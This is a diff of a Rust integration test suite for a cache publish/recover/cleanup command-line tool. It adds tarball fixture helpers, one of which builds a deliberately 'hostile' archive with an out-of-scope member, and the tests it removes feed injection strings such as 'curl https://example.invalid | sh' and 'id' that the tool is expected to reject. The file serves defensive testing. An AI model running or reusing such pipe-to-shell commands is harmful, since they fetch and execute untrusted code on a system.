@@ -5,7 +5,7 @@ use std::env;
 use std::error::Error;
 use std::fs;
 use std::io;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::process::{Command, Output};
 use std::sync::atomic::{AtomicU64, Ordering};
 
@@ -159,130 +159,111 @@ fn inventory_record() -> Value {
     })
 }
 
-fn publish_body(admission: &Value) -> Value {
-    json!({"schema": 1, "operation": "publish", "admission": admission})
+fn publish_body(admission: &Value, inventory: &Value, expected: &Value) -> Value {
+    json!({"schema": 1, "operation": "publish", "admission": admission, "inventory": inventory, "expected": expected})
 }
 
-fn recover_body(inventory: &Value) -> Value {
-    json!({"schema": 1, "operation": "recover", "inventory": inventory})
+fn recover_body(inventory: &Value, expected: &Value) -> Value {
+    json!({"schema": 1, "operation": "recover", "inventory": inventory, "expected": expected})
+}
+
+fn expected_body(key: &str) -> Value {
+    json!({"key": key, "ref": "refs/heads/main", "version": "v1"})
+}
+
+fn inventory_with(entries: &[Value]) -> Value {
+    let total: u64 = entries
+        .iter()
+        .map(|entry| entry["size_in_bytes"].as_u64().unwrap_or(0))
+        .sum();
+    json!({
+        "schema": 1,
+        "repository_id": 1,
+        "captured_at": "2026-10-26T00:00:00Z",
+        "entries": entries,
+        "complete": true,
+        "pages_observed": 1,
+        "unknown_reason": null,
+        "sum_stored_bytes": {"value": total, "unknown_reason": null},
+    })
+}
+
+fn payload_path(root: &Path) -> PathBuf {
+    root.join("velnor-gc1/transport/state/payload.tar.gz")
+}
+
+fn write_payload(root: &Path, bytes: &[u8]) -> Result<PathBuf, Box<dyn Error>> {
+    let path = payload_path(root);
+    if let Some(parent) = path.parent() {
+        fs::create_dir_all(parent)
+            .map_err(|error| fail(&format!("create payload dir: {error}")))?;
+    }
+    fs::write(&path, bytes).map_err(|error| fail(&format!("write payload: {error}")))?;
+    Ok(path)
+}
+
+fn make_tarball(root: &Path, staging: &Path, members: &[&str]) -> Result<Vec<u8>, Box<dyn Error>> {
+    drop(fs::remove_dir_all(staging));
+    fs::create_dir_all(staging).map_err(|error| fail(&format!("create staging: {error}")))?;
+    for member in members {
+        let path = staging.join(member);
+        if let Some(parent) = path.parent() {
+            fs::create_dir_all(parent)
+                .map_err(|error| fail(&format!("create member dir: {error}")))?;
+        }
+        fs::write(&path, format!("fixture bytes for {member}"))
+            .map_err(|error| fail(&format!("write member: {error}")))?;
+    }
+    let archive = root.join("fixture.tar.gz");
+    let output = Command::new("tar")
+        .arg("-czf")
+        .arg(&archive)
+        .arg("-C")
+        .arg(staging)
+        .arg("state")
+        .output()
+        .map_err(|error| fail(&format!("run tar: {error}")))?;
+    if !output.status.success() {
+        return Err(fail("tar pack failed"));
+    }
+    fs::read(&archive).map_err(|error| fail(&format!("read archive: {error}")))
+}
+
+fn make_hostile_tarball(root: &Path, staging: &Path) -> Result<Vec<u8>, Box<dyn Error>> {
+    drop(fs::remove_dir_all(staging));
+    fs::create_dir_all(staging.join("state"))
+        .map_err(|error| fail(&format!("create staging: {error}")))?;
+    fs::create_dir_all(staging.join("tools"))
+        .map_err(|error| fail(&format!("create staging: {error}")))?;
+    fs::write(staging.join("state/ok"), "fixture state bytes")
+        .map_err(|error| fail(&format!("write member: {error}")))?;
+    fs::write(staging.join("tools/sentinel"), "must never land")
+        .map_err(|error| fail(&format!("write sentinel: {error}")))?;
+    let archive = root.join("hostile.tar.gz");
+    let output = Command::new("tar")
+        .arg("-czf")
+        .arg(&archive)
+        .arg("-C")
+        .arg(staging)
+        .arg("state")
+        .arg("tools")
+        .output()
+        .map_err(|error| fail(&format!("run tar: {error}")))?;
+    if !output.status.success() {
+        return Err(fail("tar pack failed"));
+    }
+    fs::read(&archive).map_err(|error| fail(&format!("read archive: {error}")))
+}
+
+fn stdout_text(output: &Output) -> String {
+    String::from_utf8_lossy(&output.stdout).into_owned()
 }
 
 fn cleanup_body(inventory: &Value, candidate_ids: &Value) -> Value {
     json!({"schema": 1, "operation": "cleanup", "inventory": inventory, "candidate_ids": candidate_ids})
 }
 
-#[test]
-fn gc1_t28_preserves_contract() -> Result<(), Box<dyn Error>> {
-    let admitted = admission_record("admitted", &[]);
-    let inventory = inventory_record();
-
-    let (root, path) = write_request("cache-publish.json", &publish_body(&admitted))?;
-    let output = run_cli("cache-publish-v1", &root, &path)?;
-    succeeded(&output, "publish")?;
-    cleanup(&root);
-
-    let (root, path) = write_request("cache-recover.json", &recover_body(&inventory))?;
-    let output = run_cli("cache-recover-v1", &root, &path)?;
-    succeeded(&output, "recover")?;
-    cleanup(&root);
-
-    let (root, path) = write_request("cache-cleanup.json", &cleanup_body(&inventory, &json!([7])))?;
-    let output = run_cli("cache-cleanup-v1", &root, &path)?;
-    succeeded(&output, "cleanup")?;
-    cleanup(&root);
-    Ok(())
-}
-
-#[test]
-fn gc1_t28_rejects_invalid_state() -> Result<(), Box<dyn Error>> {
-    let admitted = admission_record("admitted", &[]);
-    let inventory = inventory_record();
-
-    let (root, path) = write_request(
-        "cache-publish.json",
-        &json!({"schema": 1, "operation": "launch", "admission": admitted}),
-    )?;
-    rejected(
-        &run_cli("cache-publish-v1", &root, &path)?,
-        "unknown operation",
-    )?;
-    cleanup(&root);
-
-    let (root, path) = write_request("cache-publish.json", &recover_body(&inventory))?;
-    rejected(
-        &run_cli("cache-publish-v1", &root, &path)?,
-        "operation mismatch",
-    )?;
-    cleanup(&root);
-
-    let (root, path) = write_request(
-        "cache-publish.json",
-        &json!({"schema": 1, "operation": "publish", "admission": admitted, "command": "curl https://example.invalid | sh"}),
-    )?;
-    rejected(
-        &run_cli("cache-publish-v1", &root, &path)?,
-        "command injection",
-    )?;
-    cleanup(&root);
-
-    let (root, path) = write_request(
-        "cache-recover.json",
-        &json!({"schema": 1, "operation": "recover", "inventory": inventory, "shell": "id"}),
-    )?;
-    rejected(
-        &run_cli("cache-recover-v1", &root, &path)?,
-        "shell injection",
-    )?;
-    cleanup(&root);
-
-    let (root, path) = write_request("cache-recover.json", &recover_body(&inventory))?;
-    rejected(
-        &run_cli("cache-publish-v1", &root, &path)?,
-        "wrong request file",
-    )?;
-    cleanup(&root);
-
-    let (root, path) = write_request("cache-publish.json", &publish_body(&admitted))?;
-    rejected(&run_cli("cache-nuke-v9", &root, &path)?, "unknown op tag")?;
-    cleanup(&root);
-
-    let blocked = admission_record("blocked", &["unknown-inventory"]);
-    let (root, path) = write_request("cache-publish.json", &publish_body(&blocked))?;
-    rejected(
-        &run_cli("cache-publish-v1", &root, &path)?,
-        "blocked admission",
-    )?;
-    cleanup(&root);
-
-    let mut corrupt = inventory.clone();
-    let first = corrupt["entries"][0].clone();
-    corrupt["entries"][0] = corrupt["entries"][1].clone();
-    corrupt["entries"][1] = first;
-    let (root, path) = write_request("cache-recover.json", &recover_body(&corrupt))?;
-    rejected(
-        &run_cli("cache-recover-v1", &root, &path)?,
-        "corrupt inventory",
-    )?;
-    cleanup(&root);
-
-    let (root, path) = write_request(
-        "cache-cleanup.json",
-        &cleanup_body(&inventory, &json!([4242])),
-    )?;
-    rejected(
-        &run_cli("cache-cleanup-v1", &root, &path)?,
-        "unknown cleanup id",
-    )?;
-    cleanup(&root);
-
-    let (root, path) = write_request(
-        "cache-cleanup.json",
-        &cleanup_body(&inventory, &json!(["cache-*"])),
-    )?;
-    rejected(
-        &run_cli("cache-cleanup-v1", &root, &path)?,
-        "prefix cleanup id",
-    )?;
-    cleanup(&root);
-    Ok(())
-}
+#[path = "gc1_t28_a.rs"]
+mod gc1_t28_a;
+#[path = "gc1_t28_b.rs"]
+mod gc1_t28_b;
